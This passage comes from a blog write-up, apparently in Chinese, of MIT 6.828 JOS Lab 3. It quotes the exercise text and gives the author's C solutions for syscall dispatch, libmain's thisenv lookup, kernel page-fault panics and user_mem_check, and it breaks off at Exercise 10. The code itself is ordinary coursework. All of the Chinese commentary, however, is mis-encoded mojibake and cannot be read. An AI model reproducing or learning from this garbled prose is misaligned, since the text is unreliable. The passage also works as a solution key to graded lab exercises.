ä¸­é—¨æè¿°ç¬¦çš„ç‰¹æƒçº§ï¼Œè‹¥ç‰¹æƒçº§ä¸º 0 ï¼Œç”¨æˆ·è¿›ç¨‹æ²¡æœ‰æƒé™è®¿é—®å¯¹åº”é¡µé¢ï¼Œè‡ªç„¶ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼›è‹¥ç‰¹æƒçº§ä¸º3ï¼Œåˆ™è‡ªç„¶èƒ½æ­£å¸¸é€šè¿‡é—¨æè¿°ç¬¦è§¦å‘æ–­ç‚¹å¼‚å¸¸ã€‚</p></li><li><p>What do you think is the point of these mechanisms, particularly in light of what the <code>user/softint</code> test program does?</p><p>ç›®çš„æ˜¯ä¸å…è®¸ç”¨æˆ·éšæ„é€šè¿‡é—¨æè¿°ç¬¦è¿›å…¥ä¸è¯¥è¿›å…¥çš„å¤„ç†ç¨‹åºä¸­</p></li></ol></blockquote><h3 id="System-calls">System calls</h3><p>ç”¨æˆ·è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨å‘å†…æ ¸è¯·æ±‚èµ„æºï¼Œå½“ç”¨æˆ·è¿›ç¨‹è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå¤„ç†å™¨è¿›å…¥å†…æ ¸æ€ï¼Œä¿å­˜ç”¨æˆ·è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œä¹‹åå†…æ ¸æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ä»£ç ï¼Œæœ€åæ¢å¤å›ç”¨æˆ·è¿›ç¨‹</p><p>åœ¨ JOS ä¸­æˆ‘ä»¬ä½¿ç”¨ <code>int 0x30</code> æ¥å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œè¿›ç¨‹é€šè¿‡å¯¹åº”çš„å¯„å­˜å™¨ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼ˆeaxï¼‰ä¸å‚æ•°ï¼ˆedxï¼Œecxï¼Œebxï¼Œediï¼Œesiï¼‰ï¼Œè¿”å›å€¼å­˜æ”¾åœ¨ rax å¯„å­˜å™¨ä¸­</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 7ï¼Œè¡¥å®Œ JOS çš„ç³»ç»Ÿè°ƒç”¨æœºåˆ¶</p><blockquote><p><strong>Exercise 7.</strong> Add a handler in the kernel for interrupt vector <code>T_SYSCALL</code>. You will have to edit <code>kern/trapentry.S</code> and <code>kern/trap.c</code>â€™s <code>trap_init()</code>. You also need to change <code>trap_dispatch()</code> to handle the system call interrupt by calling <code>syscall()</code> (defined in <code>kern/syscall.c</code>) with the appropriate arguments, and then arranging for the return value to be passed back to the user process in <code>%eax</code>. Finally, you need to implement <code>syscall()</code> in <code>kern/syscall.c</code>. Make sure <code>syscall()</code> returns <code>-E_INVAL</code> if the system call number is invalid. You should read and understand <code>lib/syscall.c</code> (especially the inline assembly routine) in order to confirm your understanding of the system call interface. Handle all the system calls listed in <code>inc/syscall.h</code> by invoking the corresponding kernel function for each call.</p><p>Run the <code>user/hello</code> program under your kernel (make run-hello). It should print â€œ<code>hello, world</code>â€ on the console and then cause a page fault in user mode. If this does not happen, it probably means your system call handler isnâ€™t quite right. You should also now be able to get make grade to succeed on the <code>testbss</code> test.</p></blockquote><p>é¦–å…ˆæ˜¯åœ¨å¤§ switch é‡Œè°ƒç”¨ JOS çš„ syscall æ¥å£ï¼Œè¿™é‡Œ<strong>åˆ«å¿˜äº†æ˜¾å¼åœ°å°†è¿”å›å€¼ç»™åˆ° eax</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> T_SYSCALL:<br>tf-&gt;tf_regs.reg_eax = syscall(tf-&gt;tf_regs.reg_eax, <br>tf-&gt;tf_regs.reg_edx, tf-&gt;tf_regs.reg_ecx, <br>tf-&gt;tf_regs.reg_ebx, tf-&gt;tf_regs.reg_edi, <br>tf-&gt;tf_regs.reg_esi);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>ä¹‹åä¿®æ”¹ <code>kern/syscall.c</code> ä¸­çš„ <code>syscall()</code> å‡½æ•°ï¼Œç¬”è€…æœ¬æƒ³é€‰æ‹©å£°æ˜ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œåœ¨è¿›è¡Œè°ƒç”¨æ—¶ç›´æ¥æŸ¥è¡¨è°ƒç”¨å³å¯ï¼Œä½†æ˜¯ JOS å·²ç»å†™äº†ä¸€ä¸ª switch åœ¨è¿™é‡Œï¼Œé‚£å°±ä¸€åˆ‡ä»ç®€å§ï¼ˆç¬‘ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Dispatches to the correct kernel function, passing the arguments.</span><br><span class="hljs-type">int32_t</span><br><span class="hljs-title function_">syscall</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> syscallno, <span class="hljs-type">uint32_t</span> a1, <span class="hljs-type">uint32_t</span> a2, <span class="hljs-type">uint32_t</span> a3, <span class="hljs-type">uint32_t</span> a4, <span class="hljs-type">uint32_t</span> a5)</span><br>&#123;<br><span class="hljs-comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span><br><span class="hljs-comment">// Return any appropriate return value.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// panic(&quot;syscall not implemented&quot;);</span><br><br><span class="hljs-keyword">switch</span> (syscallno) &#123;<br><span class="hljs-keyword">case</span> SYS_cputs:<br>sys_cputs((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)a1, a2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> SYS_cgetc:<br><span class="hljs-keyword">return</span> sys_cgetc();<br><span class="hljs-keyword">case</span> SYS_getenvid:<br><span class="hljs-keyword">return</span> sys_getenvid();<br><span class="hljs-keyword">case</span> SYS_env_destroy:<br><span class="hljs-keyword">return</span> sys_env_destroy(a1);<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆä¹‹ååº”å½“èƒ½é€šè¿‡ grade é‡Œçš„ testbssï¼š</p><p><img src="https://s2.loli.net/2022/03/17/qseB1tyViWIrdDG.png" alt="image.png"></p><p>ä¹‹åæ˜¯ Challengeï¼Œä¿®æ”¹ä»£ç ä½¿ç”¨ sysenter ä¸ sysexit å®ç°ç³»ç»Ÿè°ƒç”¨æœºåˆ¶</p><blockquote><p><em>hallenge!</em> Implement system calls using the <code>sysenter</code> and <code>sysexit</code> instructions instead of using <code>int 0x30</code> and <code>iret</code>.</p><p>The <code>sysenter/sysexit</code> instructions were designed by Intel to be faster than <code>int/iret</code>. They do this by using registers instead of the stack and by making assumptions about how the segmentation registers are used. The exact details of these instructions can be found in Volume 2B of the Intel reference manuals.</p><p>The easiest way to add support for these instructions in JOS is to add a <code>sysenter_handler</code> in <code>kern/trapentry.S</code> that saves enough information about the user environment to return to it, sets up the kernel environment, pushes the arguments to <code>syscall()</code> and calls <code>syscall()</code> directly. Once <code>syscall()</code> returns, set everything up for and execute the <code>sysexit</code> instruction. You will also need to add code to <code>kern/init.c</code> to set up the necessary model specific registers (MSRs). Section 6.1.2 in Volume 2 of the AMD Architecture Programmerâ€™s Manual and the reference on SYSENTER in Volume 2B of the Intel reference manuals give good descriptions of the relevant MSRs. You can find an implementation of <code>wrmsr</code> to add to <code>inc/x86.h</code> for writing to these MSRs <a href="http://ftp.kh.edu.tw/Linux/SuSE/people/garloff/linux/k6mod.c">here</a>.</p><p>Finally, <code>lib/syscall.c</code> must be changed to support making a system call with <code>sysenter</code>. Here is a possible register layout for the <code>sysenter</code> instruction:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">eax</span>                - <span class="hljs-keyword">syscall</span> number<br><span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">edi</span> - arg1, arg2, arg3, arg4<br><span class="hljs-built_in">esi</span>                - return pc<br><span class="hljs-built_in">ebp</span>                - return <span class="hljs-built_in">esp</span><br><span class="hljs-built_in">esp</span>                - trashed by <span class="hljs-keyword">sysenter</span><br><br></code></pre></td></tr></table></figure><p>GCCâ€™s inline assembler will automatically save registers that you tell it to load values directly into. Donâ€™t forget to either save (push) and restore (pop) other registers that you clobber, or tell the inline assembler that youâ€™re clobbering them. The inline assembler doesnâ€™t support saving <code>%ebp</code>, so you will need to add code to save and restore it yourself. The return address can be put into <code>%esi</code> by using an instruction like <code>leal after_sysenter_label, %%esi</code>.</p><p>Note that this only supports 4 arguments, so you will need to leave the old method of doing system calls around to support 5 argument system calls. Furthermore, because this fast path doesnâ€™t update the current environmentâ€™s trap frame, it wonâ€™t be suitable for some of the system calls we add in later labs.</p><p>You may have to revisit your code once we enable asynchronous interrupts in the next lab. Specifically, youâ€™ll need to enable interrupts when returning to the user process, which <code>sysexit</code> doesnâ€™t do for you.</p></blockquote><p><s>æ²¡é‚£é—²å·¥å¤«ï¼ŒğŸ‘´é€‰æ‹©æ‘¸äº†</s></p><h3 id="User-mode-startup">User-mode startup</h3><p>ç”¨æˆ·è¿›ç¨‹çš„å…¥å£ç‚¹åœ¨ <code>lib/entry.S</code>ï¼Œå…¶åœ¨åˆå§‹åŒ–åä¼šè°ƒç”¨ <code>libmain()</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦ä¿®æ”¹è¯¥å‡½æ•°ï¼šå°†å…¨å±€å˜é‡ <code>thisenv</code> æŒ‡å‘å½“å‰è¿›ç¨‹çš„ Env ç»“æ„ä½“</p><p><code>libmain()</code> ä¹‹åä¼šè°ƒç”¨ <code>umain()</code>ï¼Œå®šä¹‰äº <code>user/hello.c</code> ä¸­ï¼Œåœ¨æ‰“å° hello world ä¹‹åå…¶ä¼šå°è¯•è®¿é—® <code>thisenv-&gt;env_id</code>ï¼Œåœ¨ä¹‹å‰çš„å®éªŒä¸­è¿™ä¼šè§¦å‘å¼‚å¸¸ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åº”å½“åˆå§‹åŒ– <code>thisenv</code> ä»¥è®©ä»–ä¸è§¦å‘å¼‚å¸¸</p><p>äºæ˜¯æˆ‘ä»¬æ¥åˆ°äº† Exercise 8ï¼Œ<strong>è¿›å…¥åˆ°ç”¨æˆ·æ€çš„ä¸–ç•Œ</strong>ï¼ˆå…¶å®ç³»ç»Ÿè°ƒç”¨é‚£é‡Œå·²ç»åœ¨ç”¨æˆ·æ€ä¸å†…æ ¸æ€â€œæ¥å»ä¹‹é—´â€äº†ï¼‰</p><blockquote><p><strong>Exercise 8.</strong> Add the required code to the user library, then boot your kernel. You should see <code>user/hello</code> print â€œ<code>hello, world</code>â€ and then print â€œ<code>i am environment 00001000</code>â€. <code>user/hello</code> then attempts to â€œexitâ€ by calling <code>sys_env_destroy()</code> (see <code>lib/libmain.c</code> and <code>lib/exit.c</code>). Since the kernel currently only supports one user environment, it should report that it has destroyed the only environment and then drop into the kernel monitor. You should be able to get make grade to succeed on the <code>hello</code> test.</p></blockquote><p>è·å–åˆ°è¿›ç¨‹ id åéå† envs æ•°ç»„å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">libmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-comment">// set thisenv to point at our Env structure in envs[].</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-type">int</span> env_id;<br><span class="hljs-type">size_t</span> i;<br><br>env_id = sys_getenvid();<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NENV; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (envs[i].env_id == env_id)<br>&#123;<br>thisenv = &amp;envs[i];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// thisenv = 0;</span><br><br><span class="hljs-comment">// save the name of the program so that panic() can use it</span><br><span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">0</span>)<br>binaryname = argv[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// call user main routine</span><br>umain(argc, argv);<br><br><span class="hljs-comment">// exit gracefully</span><br><span class="hljs-built_in">exit</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™æ—¶è¿è¡Œè¯„åˆ†ç¨‹åºåº”å½“èƒ½é€šè¿‡ helloï¼š</p><p><img src="https://s2.loli.net/2022/03/17/nUNeugYvxTH7p5b.png" alt="image.png"></p><h3 id="Page-faults-and-memory-protection">Page faults and memory protection</h3><p>OS é€šå¸¸ä¾èµ–äºç¡¬ä»¶ä»¥ä¿æŠ¤å†…å­˜ï¼Œå½“ä¸€ä¸ªç¨‹åºå°è¯•è®¿é—®éæ³•åœ°å€æˆ–æ— æƒé™åœ°å€æ—¶å¤„ç†å™¨ä¼šåœæ­¢è¿›ç¨‹è¿è¡Œï¼Œå¹¶å¸¦ç€é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤ä¿¡æ¯é™·å…¥å†…æ ¸ï¼Œè‹¥è¯¥å¼‚å¸¸å¯ä»¥è¢«ä¿®å¤åˆ™å†…æ ¸å°†å…¶ä¿®å¤åå†è®©ç¨‹åºç»§ç»­è¿è¡Œï¼Œå¦åˆ™ä¼šç»ˆæ­¢ç¨‹åºè¿è¡Œ</p><p>ä¸€ä¸ªå¯ä»¥è¢«ä¿®å¤çš„å¼‚å¸¸çš„èŒƒä¾‹ä¾¿æ˜¯æ ˆçš„å¢é•¿ï¼Œåœ¨åˆå§‹æ—¶æˆ‘ä»¬ä»…ä¸ºç”¨æˆ·è¿›ç¨‹æ ˆåˆ†é…äº†ä¸€å¼ é¡µï¼Œå½“æ ˆçªç ´ä¸€å¼ é¡µçš„å¤§å°æ—¶ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶å†…æ ¸åº”å½“è‡ªåŠ¨åˆ†é…ä¸€ä¸ªæ–°çš„å†…å­˜é¡µåˆ°è¯¥å¤„ï¼Œå¹¶è®©ç¨‹åºç»§ç»­è¿è¡Œ</p><p>ç³»ç»Ÿè°ƒç”¨åŒæ ·å¯ä»¥åœ¨å†…å­˜ä¿æŠ¤ä¸Šé€ æˆé—®é¢˜ï¼šå¤§éƒ¨åˆ†çš„ç³»ç»Ÿè°ƒç”¨æ¥å£éƒ½ä¼šè®©ç”¨æˆ·ç¨‹åºå‘å†…æ ¸ä¼ é€’ä¸€ä¸ªæŒ‡é’ˆï¼Œè€Œå†…æ ¸éœ€è¦è§£å¼•ç”¨è¿™äº›æŒ‡é’ˆï¼Œè¿™ä¾¿ä¼šæœ‰ä¸¤ä¸ªé—®é¢˜â€œ</p><ul><li>å†…æ ¸ç©ºé—´ä¸­çš„ç¼ºé¡µå¼‚å¸¸æ¯”ç”¨æˆ·ç©ºé—´ä¸­çš„ç¼ºé¡µå¼‚å¸¸è¦ä¸¥é‡å¾—å¤šï¼Œè‹¥å†…æ ¸åœ¨æ“çºµè‡ªå·±çš„æ•°æ®ç»“æ„æ—¶å‡ºç°ç¼ºé¡µå¼‚å¸¸ï¼Œé‚£å°±æ˜¯ kernel bugï¼Œåº”å½“å¼•èµ· kernel panicï¼Œä½†è‹¥è¿™äº›æŒ‡é’ˆæ¥è‡ªäºç”¨æˆ·è¿›ç¨‹ï¼Œåˆ™åº”å½“è¦æ ‡è¯†å‡ºè¿™ç¼ºé¡µå¼‚å¸¸æ˜¯ä»£è¡¨ç”¨æˆ·è¿›ç¨‹çš„</li><li>å†…æ ¸æœ‰ç€é«˜äºç”¨æˆ·è¿›ç¨‹çš„æƒé™ï¼Œå› æ­¤ç”¨æˆ·ç¨‹åºå¯èƒ½ä¼šä¼ é€’ä¸€ä¸ªæŒ‡å‘ç”¨æˆ·ä¸å¯è¯»å†™ä½†æ˜¯å†…æ ¸å¯è¯»å†™çš„åŒºåŸŸï¼Œè¿™ä¹Ÿæ˜¯å†…æ ¸éœ€è¦æ³¨æ„çš„</li></ul><p>å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªåœ°å€æ£€æŸ¥çš„åŠŸèƒ½ï¼Œå†…æ ¸éœ€è¦ç”¨å…¶æ¥æ£€æŸ¥ç”¨æˆ·ç¨‹åºä¼ å…¥çš„æŒ‡é’ˆæ˜¯å¦æŒ‡å‘ç”¨æˆ·ç©ºé—´ï¼Œä»¥åŠé¡µè¡¨æ˜¯å¦å…è®¸ç›¸å…³æ“ä½œ</p><p>ä»¥æ­¤ï¼Œå†…æ ¸æ°¸è¿œä¸ä¼šå› ä¸ºè§£å¼•ç”¨ç”¨æˆ·æä¾›çš„æŒ‡é’ˆè€Œé€ æˆç¼ºé¡µå¼‚å¸¸ï¼Œè‹¥å†…æ ¸å‘ç”Ÿäº†ç¼ºé¡µå¼‚å¸¸ï¼Œåˆ™åº”å½“ panicâ€”â€”è¿™å°±æ˜¯æ¥ä¸‹æ¥çš„ Exercise 9ï¼Œä¿®æ”¹ <code>kern/trap.c</code> è®©å†…æ ¸æ€ä¸‹å‘ç”Ÿçš„ç¼ºé¡µå¼‚å¸¸é€ æˆ kernel panic</p><blockquote><p><strong>Exercise 9.</strong> Change <code>kern/trap.c</code> to panic if a page fault happens in kernel mode.</p><p>Hint: to determine whether a fault happened in user mode or in kernel mode, check the low bits of the <code>tf_cs</code>.</p><p>Read <code>user_mem_assert</code> in <code>kern/pmap.c</code> and implement <code>user_mem_check</code> in that same file.</p><p>Change <code>kern/syscall.c</code> to sanity check arguments to system calls.</p><p>Boot your kernel, running <code>user/buggyhello</code>. The environment should be destroyed, and the kernel should <em>not</em> panic. You should see:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">00001000</span>] user_mem_check <span class="hljs-keyword">assertion</span> failure <span class="hljs-keyword">for</span> va <span class="hljs-number">00000001</span><br>[<span class="hljs-number">00001000</span>] free env <span class="hljs-number">00001000</span><br>Destroyed the <span class="hljs-keyword">only</span> environment - <span class="hljs-keyword">nothing</span> more <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span>!<br><br></code></pre></td></tr></table></figure><p>Finally, change <code>debuginfo_eip</code> in <code>kern/kdebug.c</code> to call <code>user_mem_check</code> on <code>usd</code>, <code>stabs</code>, and <code>stabstr</code>. If you now run <code>user/breakpoint</code>, you should be able to run backtrace from the kernel monitor and see the backtrace traverse into <code>lib/libmain.c</code> before the kernel panics with a page fault. What causes this page fault? You donâ€™t need to fix it, but you should understand why it happens.</p></blockquote><p>é¦–å…ˆæ˜¯ä¿®æ”¹ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºï¼Œè‹¥æˆ‘ä»¬éœ€è¦ç¡®å®šä¸€ä¸ªç¼ºé¡µå¼‚å¸¸å‘ç”Ÿåœ¨ç”¨æˆ·æ€è¿˜æ˜¯å†…æ ¸æ€ï¼Œåªéœ€è¦æ£€æŸ¥ Trapframe ä¸­ cs æ®µå¯„å­˜å™¨çš„ RPL ä½å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_fault_handler</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> fault_va;<br><br><span class="hljs-comment">// Read processor&#x27;s CR2 register to find the faulting address</span><br>fault_va = rcr2();<br><br><span class="hljs-comment">// Handle kernel-mode page faults.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// check whether it happened in kernel mode or not</span><br><span class="hljs-keyword">if</span> (!(tf-&gt;tf_cs &amp; <span class="hljs-number">0b11</span>))<br>panic(<span class="hljs-string">&quot;kernel page fault!&quot;</span>);<br><br><span class="hljs-comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span><br><span class="hljs-comment">// the page fault happened in user mode.</span><br><br><span class="hljs-comment">// Destroy the environment that caused the fault.</span><br>cprintf(<span class="hljs-string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,<br>curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);<br>print_trapframe(tf);<br>env_destroy(curenv);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="user-mem-check-ï¼šæ£€æŸ¥ç”¨æˆ·åœ°å€åˆæ³•æ€§">user_mem_check()ï¼šæ£€æŸ¥ç”¨æˆ·åœ°å€åˆæ³•æ€§</h4><p>æœ€åæ˜¯ä¿®æ”¹ <code>user_mem_check()</code>ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li>æ£€æŸ¥åœ°å€æ˜¯å¦è½åœ¨ç”¨æˆ·ç©ºé—´</li><li>æ£€æŸ¥é¡µè¡¨é¡¹ï¼Œç”¨æˆ·æ˜¯å¦æœ‰ç›¸åº”æƒé™</li></ul><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å¯èƒ½å‘ç”Ÿçš„æ•´å‹æº¢å‡ºå¯¼è‡´çš„åœ°å€å›ç»•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Check that an environment is allowed to access the range of memory</span><br><span class="hljs-comment">// [va, va+len) with permissions &#x27;perm | PTE_P&#x27;.</span><br><span class="hljs-comment">// Normally &#x27;perm&#x27; will contain PTE_U at least, but this is not required.</span><br><span class="hljs-comment">// &#x27;va&#x27; and &#x27;len&#x27; need not be page-aligned; you must test every page that</span><br><span class="hljs-comment">// contains any of that range.  You will test either &#x27;len/PGSIZE&#x27;,</span><br><span class="hljs-comment">// &#x27;len/PGSIZE + 1&#x27;, or &#x27;len/PGSIZE + 2&#x27; pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// A user program can access a virtual address if (1) the address is below</span><br><span class="hljs-comment">// ULIM, and (2) the page table gives it permission.  These are exactly</span><br><span class="hljs-comment">// the tests you should implement here.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If there is an error, set the &#x27;user_mem_check_addr&#x27; variable to the first</span><br><span class="hljs-comment">// erroneous virtual address.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns 0 if the user program can access this range of addresses,</span><br><span class="hljs-comment">// and -E_FAULT otherwise.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">user_mem_check</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *env, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *va, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-type">uint32_t</span> start, end;<br><span class="hljs-type">pte_t</span> *pte;<br><br>start = ((<span class="hljs-type">uint32_t</span>) va) &amp; (~(PGSIZE - <span class="hljs-number">1</span>));<br>end = ROUNDUP(((<span class="hljs-type">uint32_t</span>) va) + len, PGSIZE);<br><br><span class="hljs-keyword">for</span> (; start &lt; end; start += PGSIZE)<br>&#123;<br>pte = pgdir_walk(env-&gt;env_pgdir, (<span class="hljs-type">void</span>*)start, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ((!pte) || (start &gt;= ULIM) || !(*pte &amp; PTE_P) || ((*pte &amp; perm) != perm))<br>&#123;<br>user_mem_check_addr =  (start &lt; (<span class="hljs-type">uint32_t</span>)va ? (<span class="hljs-type">uint32_t</span>)va : start);<br><span class="hljs-keyword">return</span> -E_FAULT;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ä¿®æ”¹ <code>debuginfo_eip()</code>ï¼Œåœ¨ <code>usd</code>, <code>stabs</code>, <code>stabstr</code> è¿™ä¸‰ä¸ªåœ°æ–¹åŠ ä¸Š <code>user_mem_check()</code> è¿›è¡Œåœ°å€åˆæ³•æ€§æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">// Make sure this memory is valid.</span><br><span class="hljs-comment">// Return -1 if it is not.  Hint: Call user_mem_check.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)usd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> UserStabData), PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>stabs = usd-&gt;stabs;<br>stab_end = usd-&gt;stab_end;<br>stabstr = usd-&gt;stabstr;<br>stabstr_end = usd-&gt;stabstr_end;<br><br><span class="hljs-comment">// Make sure the STABS and string table memory is valid.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)stabs, stab_end - stabs, PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)stabstr, stabstr_end - stabstr, PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ Exercise 10ï¼Œé˜²æ­¢ evilhello å¯¼è‡´ kernel panic</p><blockquote><p><strong>Exercise 10.</strong> Boot your kernel, running <code>user/evilhello</code>. The environment should be destroyed, and the kernel should not panic. You should see:</p><figure 